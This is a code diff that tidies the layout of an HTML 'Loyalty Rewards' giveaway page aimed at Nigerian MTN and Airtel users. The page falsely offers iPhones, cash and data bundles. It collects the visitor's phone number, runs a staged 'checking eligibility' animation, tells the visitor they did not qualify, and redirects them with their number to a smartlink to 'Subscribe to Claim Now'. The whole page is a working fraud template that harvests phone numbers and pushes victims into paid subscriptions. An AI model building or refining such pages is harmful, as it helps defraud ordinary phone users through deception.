@@ -1,7 +1,8 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>2025 Loyalty Rewards Program</title>
   <style>
     body {
@@ -32,20 +33,21 @@
       line-height: 1.5;
       color: #ccc;
     }
-    .image-row {
-      display: flex;
-      justify-content: space-between;
-      gap: 10px;
+
+    .image-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
       margin: 20px 0;
     }
-    .image-row img {
+    .image-grid img {
       width: 100%;
-      max-width: 100px;
-      aspect-ratio: 1/1;
+      aspect-ratio: 1 / 1;
       object-fit: cover;
       border-radius: 8px;
       border: 2px solid #333;
     }
+
     .below-image-text {
       text-align: center;
       margin-bottom: 20px;
@@ -161,30 +163,35 @@
       <p>
         As part of our 2025 Customer Rewards Program, selected users may be eligible to receive a free iPhone 14 Pro Max, ₦5,000,000 cash prize or unlimited data bundle.
       </p>
-    </div><div class="image-row">
-  <img src="https://i.postimg.cc/vmpk9fRZ/images-2-8.jpg" alt="iPhone Giveaway" />
-  <img src="https://i.postimg.cc/XqWP1WYM/images-2-10.jpg" alt="₦5 Million Cash Prize" />
-  <img src="https://i.postimg.cc/j5nKYRTL/images-2-11.jpg" alt="Car Giveaway" />
-  <img src="https://i.postimg.cc/h4p4WVC6/Screenshot-20250731-071855.jpg" alt="Unlimited Data" />
     </div>
 
-<div class="below-image-text">
-  Enter your mobile number below to check if you're qualified
-</div>
+    <div class="image-grid">
+      <img src="https://i.postimg.cc/vmpk9fRZ/images-2-8.jpg" alt="iPhone Giveaway" />
+      <img src="https://i.postimg.cc/XqWP1WYM/images-2-10.jpg" alt="₦5 Million Cash Prize" />
+      <img src="https://i.postimg.cc/j5nKYRTL/images-2-11.jpg" alt="Car Giveaway" />
+      <img src="https://i.postimg.cc/h4p4WVC6/Screenshot-20250731-071855.jpg" alt="Unlimited Data" />
+    </div>
 
-<div class="form-group">
-  <input type="tel" id="msisdn" placeholder="Enter your MTN or Airtel number" />
-  <button onclick="startCheck()">Check Eligibility</button>
-</div>
+    <div class="below-image-text">
+      Enter your mobile number below to check if you're qualified
+    </div>
 
-<div class="footer">
-  Only MTN and Airtel users are eligible. Terms & Conditions apply.
-</div>
+    <div class="form-group">
+      <input type="tel" id="msisdn" placeholder="Enter your MTN or Airtel number" />
+      <button onclick="startCheck()">Check Eligibility</button>
+    </div>
 
-  </div>  <div class="loading-screen" id="loading">
+    <div class="footer">
+      Only MTN and Airtel users are eligible. Terms & Conditions apply.
+    </div>
+  </div>
+
+  <div class="loading-screen" id="loading">
     <div class="loader"></div>
     <div class="loading-text" id="loadingMessage">Checking eligibility...</div>
-  </div>  <div class="popup" id="result">
+  </div>
+
+  <div class="popup" id="result">
     <div class="popup-box">
       <h2>Sorry</h2>
       <p>You didn't qualify for an iPhone giveaway.<br><br>
@@ -193,7 +200,9 @@
       <button onclick="redirectToOffer()">Subscribe to Claim Now</button>
       <small>Your mobile number is required</small>
     </div>
-  </div>  <script>
+  </div>
+
+  <script>
     function startCheck() {
       const number = document.getElementById('msisdn').value;
       if (!/^0[789][01]\d{8}$/.test(number)) {
@@ -217,7 +226,7 @@
         }
         index++;
         if (index >= messages.length) clearInterval(interval);
-      }, 1800); // total 9 seconds with 5 messages
+      }, 1800);
 
       setTimeout(() => {
         document.getElementById('loading').style.display = 'none';
@@ -229,5 +238,6 @@
       const number = document.getElementById('msisdn').value;
       window.location.href = `https://your-smartlink.com/?msisdn=${number}`;
     }
-  </script></body>
+  </script>
+</body>
 </html>
